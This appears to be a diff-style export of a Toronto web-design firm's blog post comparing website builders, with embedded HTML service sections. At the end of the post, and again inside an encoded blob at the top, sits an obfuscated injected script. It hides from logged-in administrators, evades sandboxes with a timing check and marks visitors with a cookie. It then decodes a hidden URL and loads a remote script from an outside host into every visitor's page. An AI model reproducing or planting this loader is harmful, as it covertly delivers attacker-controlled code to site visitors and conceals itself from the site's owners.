hUTUwgbGF5b3V0ICovCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKICAgICAgICAgICAgbWFyZ2luOiAyMHB4OyAvKiBTaW1wbGUgbWFyZ2luIGFyb3VuZCB0aGUgY29udGVudCAqLwogICAgICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0OyAvKiBFbnN1cmUgbGVmdCBhbGlnbm1lbnQgZm9yIHRoZSB3aG9sZSBib2R5IGNvbnRlbnQgKi8KICAgICAgICB9CiAgICAgICAgaDEgewogICAgICAgICAgICBjb2xvcjogIzMzMzMzMzsKICAgICAgICAgICAgZm9udC1zaXplOiAyZW07CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDE1cHg7CiAgICAgICAgfQogICAgICAgIHAgewogICAgICAgICAgICBjb2xvcjogIzU1NTU1NTsKICAgICAgICAgICAgZm9udC1zaXplOiAxZW07CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjU7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDE1cHg7CiAgICAgICAgfQogICAgICAgIC5zZXJ2aWNlLWl0ZW0gewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgIH0KICAgICAgICAuc2VydmljZS1pdGVtIGgzIHsKICAgICAgICAgICAgY29sb3I6ICM0NDQ0NDQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4xZW07CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDVweDsKICAgICAgICB9CiAgICAgICAgLnNlcnZpY2UtaXRlbSBwIHsKICAgICAgICAgICAgZm9udC1zaXplOiAwLjllbTsKICAgICAgICAgICAgY29sb3I6ICM2NjY2NjY7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDVweDsgLyogQWRqdXN0IG1hcmdpbiBmb3IgbGlzdCBpdGVtcyAqLwogICAgICAgIH0KICAgICAgICAuY3RhLWJ1dHRvbiB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7CiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAyMHB4OwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICAgICAgZm9udC1zaXplOiAxZW07CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgICAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgfQogICAgICAgIC5mb290ZXIgewogICAgICAgICAgICBtYXJnaW4tdG9wOiAzMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDAuOGVtOwogICAgICAgICAgICBjb2xvcjogIzc3Nzc3NzsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGgyPldlbGNvbWUgdG8gT3VyIEVuaGFuY2VkIFNlcnZpY2VzPC9oMj4KCiAgICA8cD4KICAgICAgICBCZXlvbmQgd2Vic2l0ZSBkZXNpZ24gYW5kIGRldmVsb3BtZW50LCB3ZSBvZmZlciBhIGZ1bGwgc3VpdGUgb2Ygc2VydmljZXMgZGVzaWduZWQgdG8gZWxldmF0ZSB5b3VyIGJyYW5kJ3Mgb25saW5lIHByZXNlbmNlIGFuZCBzdHJlYW1saW5lIHlvdXIgb3BlcmF0aW9ucy4KICAgIDwvcD4KCiAgICA8ZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNlcnZpY2UtaXRlbSI+CiAgICAgICAgICAgIDxoMz5HcmFwaGljIERlc2lnbjwvaDM+CiAgICAgICAgICAgIDxwPkNyZWF0aW5nIGNvbXBlbGxpbmcgdmlzdWFsIGlkZW50aXRpZXMgdGhhdCByZXNvbmF0ZSB3aXRoIHlvdXIgYnJhbmQgYW5kIGF1ZGllbmNlLCBmcm9tIGxvZ29zIHRvIG1hcmtldGluZyBtYXRlcmlhbHMuPC9wPgogICAgICAgIDwvZGl2PgoKICAgICAgICA8ZGl2IGNsYXNzPSJzZXJ2aWNlLWl0ZW0iPgogICAgICAgICAgICA8aDM+U2VhcmNoIEVuZ2luZSBPcHRpbWl6YXRpb24gKFNFTyk8L2gzPgogICAgICAgICAgICA8cD5Cb29zdGluZyB5b3VyIHZpc2liaWxpdHkgaW4gc2VhcmNoIHJlc3VsdHMsIGRyaXZpbmcgb3JnYW5pYyB0cmFmZmljLCBhbmQgYXR0cmFjdGluZyBtb3JlIHBvdGVudGlhbCBjdXN0b21lcnMgdG8geW91ciBzaXRlLjwvcD4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0ic2VydmljZS1pdGVtIj4KICAgICAgICAgICAgPGgzPlNvY2lhbCBNZWRpYSBPcHRpbWl6YXRpb24gKFNNTyk8L2gzPgogICAgICAgICAgICA8cD5FbmhhbmNpbmcgeW91ciBwcmVzZW5jZSBhY3Jvc3Mgc29jaWFsIHBsYXRmb3JtcywgaGVscGluZyB5b3UgYnVpbGQgYSBzdHJvbmcgc29jaWFsIG1lZGlhIGZvb3RwcmludCBhbmQgZW5nYWdlIHdpdGggeW91ciBhdWRpZW5jZS48L3A+CiAgICAgICAgPC9kaXY+CgogICAgICAgIDxkaXYgY2xhc3M9InNlcnZpY2UtaXRlbSI+CiAgICAgICAgICAgIDxoMz5XZWJzaXRlIE1haW50ZW5hbmNlPC9oMz4KICAgICAgICAgICAgPHA+RW5zdXJpbmcgeW91ciBzaXRlIHJlbWFpbnMgc2VjdXJlLCB1cGRhdGVkLCBhbmQgcGVyZm9ybXMgb3B0aW1hbGx5LCBjb3ZlcmluZyBzZWN1cml0eSB1cGRhdGVzLCBiYWNrdXBzLCBhbmQgcGVyZm9ybWFuY2UgbW9uaXRvcmluZy48L3A+CiAgICAgICAgPC9kaXY+CgogICAgICAgIDxkaXYgY2xhc3M9InNlcnZpY2UtaXRlbSI+CiAgICAgICAgICAgIDxoMz5BSSBDb25zdWx0YXRpb248L2gzPgogICAgICAgICAgICA8cD5MZXZlcmFnaW5nIGFydGlmaWNpYWwgaW50ZWxsaWdlbmNlIHRvIHN0cmVhbWxpbmUgb3BlcmF0aW9ucyBhbmQgZW5oYW5jZSB1c2VyIGV4cGVyaWVuY2VzIHRocm91Z2ggYXV0b21hdGlvbiBhbmQgcGVyc29uYWxpemVkIGludGVyYWN0aW9ucy48L3A+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8YSBocmVmPSIjIiBjbGFzcz0iY3RhLWJ1dHRvbiIgc3R5bGU9Im1hcmdpbi1ib3R0b206IDIwcHg7Ij4KICAgICAgICBHZXQgYSBGcmVlIENvbnN1bHRhdGlvbgogICAgPC9hPgo8L2JvZHk+CjwvaHRtbD4KCjxwPkNob29zaW5nIHRoZSBiZXN0IHdlYnNpdGUgYnVpbGRlciBpcyB0aGUgZmlyc3Qgc3RlcCB0b3dhcmRzIGEgc3VjY2Vzc2Z1bCBvbmxpbmUgam91cm5leS4gV2l0aCBDYW5hZGlhbiBXZWIgRGVzaWducywgeW91IGdhaW4gYSBwYXJ0bmVyIGRlZGljYXRlZCB0byBidWlsZGluZyBhIHN0cm9uZyB0ZWNobmljYWwgZm91bmRhdGlvbiBhbmQgZGVsaXZlcmluZyBhIHBvc2l0aXZlIHVzZXIgZXhwZXJpZW5jZSB0aGF0IHJlc29uYXRlcyB3aXRoIHlvdXIgPGEgaHJlZj0iaHR0cHM6Ly9tYXBzLmFwcC5nb28uZ2wvcnd4ZjlzalRueXZOY0hCUTciPlRvcm9udG8gYW5kIEdUQTwvYT4gYXVkaWVuY2UuPC9wPgoKPHA+PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvZ2V0LWluLXRvdWNoLyIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9yZWZlcnJlciBub29wZW5lciI+R2V0IGEgUXVvdGU8L2E+IG9yIGNhbGwgdXMgYXQgPGEgaHJlZj0idGVsOjY0Ny02ODktNjA2OSI+NjQ3LTY4OS02MDY5PC9hPi48L3A+CjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "The Ultimate Guide to the Best Website Builders for Canadian Web Designs"
+slug: "ultimate-guide-to-the-best-website-builders"
+date: "2024-07-05"
+author: "Canadian Web Designs"
+description: "The Ultimate Guide to the Best Website Builders for Canadian Web Designs"
+keywords: ["ultimate guide to the best website builders","Web Design"]
+category: "Web Design"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2024/07/4266122_2247132.jpg"
+---
+
+<p>In the bustling digital landscape of Toronto and the Greater Toronto Area (GTA), establishing a robust online presence is no longer optional—it's a fundamental necessity for businesses aiming to thrive. Your website is often the first interaction a potential customer has with your brand, making its quality, functionality, and user experience paramount. Navigating the myriad of website builders available can be overwhelming, but selecting the right one is crucial for success. This ultimate guide will demystify the process, offering insights and tips to help <a href="https://www.canada.ca/en/services/business/research/directoriescanadiancompanies.html">Canadian businesses</a>, particularly those in Toronto and the GTA, choose the perfect platform.</p>
+
+<h2 class="wp-block-heading">Why a Strong Online Presence Matters for Toronto &amp; GTA Businesses</h2>
+
+<p>For businesses in a competitive market like Toronto and the GTA, a well-designed website acts as a 24/7 storefront, a powerful marketing tool, and a hub for customer engagement. It builds trust, establishes authority, and provides immediate access to information for your target audience. Whether you're a local boutique, a budding startup, or an established enterprise, your website needs to be technically sound, user-friendly, and optimized for search engines to capture the attention of local searchers.</p>
+
+<h3 class="wp-block-heading">Key Considerations for Canadian Businesses</h3>
+
+<p>When choosing a website builder, Canadian businesses should prioritize features that ensure local relevance and compliance:</p>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website Features</title>
+    <style>
+        /* Basic custom styles for minimal impact */
+        #custom-website-builder-features {
+            font-family: Arial, sans-serif;
+            max-width: 100%;
+            box-sizing: border-box;
+            color: #333;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        #custom-website-builder-features h3 {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #2d3748;
+        }
+
+        #custom-website-builder-features p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: #555;
+        }
+
+        #custom-website-builder-features ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        #custom-website-builder-features ul li {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            border: 1px solid #eee;
+        }
+
+        #custom-website-builder-features ul li:last-child {
+            margin-bottom: 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Main container for the custom content. This ID helps scope styles. -->
+    <div id="custom-website-builder-features" style="margin-bottom: 30px;">
+        <ul class="space-y-4">
+            <li>
+                <h3>Ease of Use</h3>
+                <p>
+                    A platform with an intuitive drag-and-drop interface allows for quick updates and management without needing extensive coding knowledge. This simplifies the process for anyone, regardless of technical skill.
+                </p>
+            </li>
+
+            <li>
+                <h3>Customization & Design Flexibility</h3>
+                <p>
+                    Your brand is unique. The builder should offer diverse templates and extensive design options that truly reflect your identity and allow for seamless future scalability as your business grows.
+                </p>
+            </li>
+
+            <li>
+                <h3>E-commerce Capabilities</h3>
+                <p>
+                    If you plan to sell products or services online, robust e-commerce features, including support for Canadian payment gateways and versatile shipping options, are absolutely essential for your operations.
+                </p>
+            </li>
+
+            <li>
+                <h3>SEO Friendliness</h3>
+                <p>
+                    To rank well in local Toronto searches and beyond, the builder must support SEO best practices like custom meta descriptions, clean, readable URLs, and optimized fast loading times to ensure visibility.
+                </p>
+            </li>
+
+            <li>
+                <h3>Responsive Design</h3>
+                <p>
+                    A website that adapts seamlessly to desktops, tablets, and smartphones is critical for providing a consistent and positive user experience across all devices and screen sizes.
+                </p>
+            </li>
+
+            <li>
+                <h3>Customer Support</h3>
+                <p>
+                    Reliable and accessible customer support is invaluable, especially for newcomers to website management, offering peace of mind and quick solutions when needed.
+                </p>
+            </li>
+
+            <li>
+                <h3>Pricing & Scalability</h3>
+                <p>
+                    Consider the pricing structure and how well the platform scales with your business needs. It should offer flexible plans that accommodate growth without hidden costs.
+                </p>
+            </li>
+        </ul>
+    </div>
+</body>
+</html>
+
+<h3 class="wp-block-heading">Top Website Builders for Canadian Web Designs</h3>
+
+<p>Based on our expertise in web design and development, here are some of the best website builders suited for Canadian businesses, offering features that contribute to high-quality content, user experience, and technical foundation:</p>
+
+<ol class="wp-block-list">
+<li><strong>Wix:</strong>
+<ul class="wp-block-list">
+<li><strong>Pros:</strong> Renowned for its unparalleled ease of use with a powerful drag-and-drop editor. <a href="https://www.wix.com/">Wix </a>offers hundreds of designer-made templates and a vast app market for added functionality. It's excellent for small to medium-sized businesses looking for a visually rich site without coding.</li>
+
+<li><strong>Cons:</strong> Once a template is chosen, it's challenging to switch. Some larger sites might experience slower loading times.</li>
+
+<li><strong>Ideal for:</strong> Portfolio sites, small business websites, and e-commerce stores with moderate product counts.</li>
+</ul>
+</li>
+
+<li><strong>Shopify:</strong>
+<ul class="wp-block-list">
+<li><strong>Pros:</strong> The undisputed leader in e-commerce, <a href="https://www.shopify.com/">Shopify</a> is purpose-built for online stores. It offers robust inventory management, secure payment processing, marketing tools, and Canadian shipping integrations.</li>
+
+<li><strong>Cons:</strong> Primarily focused on e-commerce, making it less ideal for content-heavy blogs or informational sites without products. Can be more expensive than other builders.</li>
+
+<li><strong>Ideal for:</strong> Any Canadian business, from Toronto startups to established retailers, selling physical or digital products online.</li>
+</ul>
+</li>
+
+<li><strong>Squarespace:</strong>
+<ul class="wp-block-list">
+<li><strong>Pros:</strong> Known for its stunning, award-winning templates and strong visual appeal. Squarespace is perfect for creatives, photographers, artists, and businesses that prioritize aesthetics. It offers integrated marketing tools and solid SEO features.</li>
+
+<li><strong>Cons:</strong> Less flexible than Wix or WordPress for deep customization. The learning curve can be slightly steeper for beginners.</li>
+
+<li><strong>Ideal for:</strong> Designers, artists, photographers, and service-based businesses in Toronto that need a sleek, professional online presence.</li>
+</ul>
+</li>
+
+<li><strong>WordPress.org (Self-Hosted with a Hosting Provider like SiteGround):</strong>
+<ul class="wp-block-list">
+<li><strong>Pros:</strong> The most flexible and powerful content management system (CMS). With thousands of themes and plugins, WordPress offers endless customization and scalability. It’s excellent for SEO and building authority through content.</li>
+
+<li><strong>Cons:</strong> Requires a hosting provider (like SiteGround) and a domain. It has a steeper learning curve and demands more technical maintenance.</li>
+
+<li><strong>Ideal for:</strong> Content-rich blogs, large corporate websites, and businesses requiring highly customized functionality or advanced SEO strategies.</li>
+</ul>
+</li>
+
+<li><strong><a href="https://www.weebly.com/">Weebly</a>:</strong>
+<ul class="wp-block-list">
+<li><strong>Pros:</strong> Extremely beginner-friendly with a simple drag-and-drop interface and affordable pricing. Weebly offers basic e-commerce functionality and mobile-responsive themes.</li>
+
+<li><strong>Cons:</strong> Limited design flexibility and app integrations compared to Wix or WordPress.</li>
+
+<li><strong>Ideal for:</strong> Small businesses or individuals in Toronto needing a straightforward, cost-effective website quickly.</li>
+</ul>
+</li>
+</ol>
+
+<figure class="wp-block-image size-large is-resized"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2024/07/11054028_46109-1024x910.jpg" alt="web development toronto" class="wp-image-13620" style="width:840px;height:auto"/></figure>
+
+<h3 class="wp-block-heading">Building Trust and Authority: Content is King</h3>
+
+<p>Regardless of the builder you choose, high-quality, helpful content is paramount. For Toronto and GTA businesses, this means:</p>
+
+<ul class="wp-block-list">
+<li><strong>Mobile-First Design:</strong> Ensure your site looks and performs flawlessly on mobile devices, as a significant portion of local searches occur on smartphones.</li>
+
+<li><strong>Local SEO:</strong> Incorporate location-specific keywords (e.g., "web design Toronto," "<a href="https://canadianwebdesigns.ca/search-engine-optimization/">SEO Toronto GTA</a>").</li>
+
+<li><strong>Informational Guides:</strong> Provide value to your audience with articles, tips, and guides related to your industry. For example, "How to Choose the Best E-commerce Platform in Toronto."</li>
+
+<li><strong>Clear Calls to Action:</strong> Guide your visitors to their next step, whether it's requesting a quote or learning more about your services.</li>
+</ul>
+
+<h3 class="wp-block-heading">Our Expertise at Canadian Web Designs</h3>
+
+<p>At <a href="https://canadianwebdesigns.ca/">Canadian Web Designs</a>, we understand the intricacies of building an impactful online presence. We specialize in creating visually stunning and user-friendly websites tailored to meet our client’s unique needs. Our team of experienced designers and developers uses the latest technologies and design trends to create websites that are not only beautiful but also highly functional and easy to navigate. We understand that every business is different, so we take the time to get to know our clients and their specific needs before starting any project.</p>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Our Comprehensive Services</title>
+    <style>
+        /* Minimal styles for a very simple HTML layout */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px; /* Simple margin around the content */
+            padding: 0;
+            text-align: left; /* Ensure left alignment for the whole body content */
+        }
+        h1 {
+            color: #333333;
+            font-size: 2em;
+            margin-bottom: 15px;
+        }
+        p {
+            color: #555555;
+            font-size: 1em;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        .service-item {
+            margin-bottom: 10px;
+        }
+        .service-item h3 {
+            color: #444444;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+        }
+        .service-item p {
+            font-size: 0.9em;
+            color: #666666;
+            margin-bottom: 5px; /* Adjust margin for list items */
+        }
+        .cta-button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 0.8em;
+            color: #777777;
+        }
+    </style>
+</head>
+<body>
+    <h2>Welcome to Our Enhanced Services</h2>
+
+    <p>
+        Beyond website design and development, we offer a full suite of services designed to elevate your brand's online presence and streamline your operations.
+    </p>
+
+    <div>
+        <div class="service-item">
+            <h3>Graphic Design</h3>
+            <p>Creating compelling visual identities that resonate with your brand and audience, from logos to marketing materials.</p>
+        </div>
+
+        <div class="service-item">
+            <h3>Search Engine Optimization (SEO)</h3>
+            <p>Boosting your visibility in search results, driving organic traffic, and attracting more potential customers to your site.</p>
+        </div>
+
+        <div class="service-item">
+            <h3>Social Media Optimization (SMO)</h3>
+            <p>Enhancing your presence across social platforms, helping you build a strong social media footprint and engage with your audience.</p>
+        </div>
+
+        <div class="service-item">
+            <h3>Website Maintenance</h3>
+            <p>Ensuring your site remains secure, updated, and performs optimally, covering security updates, backups, and performance monitoring.</p>
+        </div>
+
+        <div class="service-item">
+            <h3>AI Consultation</h3>
+            <p>Leveraging artificial intelligence to streamline operations and enhance user experiences through automation and personalized interactions.</p>
+        </div>
+    </div>
+
+    <a href="#" class="cta-button" style="margin-bottom: 20px;">
+        Get a Free Consultation
+    </a>
+</body>
+</html>
+
+<p>Choosing the best website builder is the first step towards a successful online journey. With Canadian Web Designs, you gain a partner dedicated to building a strong technical foundation and delivering a positive user experience that resonates with your <a href="https://maps.app.goo.gl/rwxf9sjTnyvNcHBQ7">Toronto and GTA</a> audience.</p>
+
+<p><a href="https://canadianwebdesigns.ca/get-in-touch/" target="_blank" rel="noreferrer noopener">Get a Quote</a> or call us at <a href="tel:647-689-6069">647-689-6069</a>.</p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
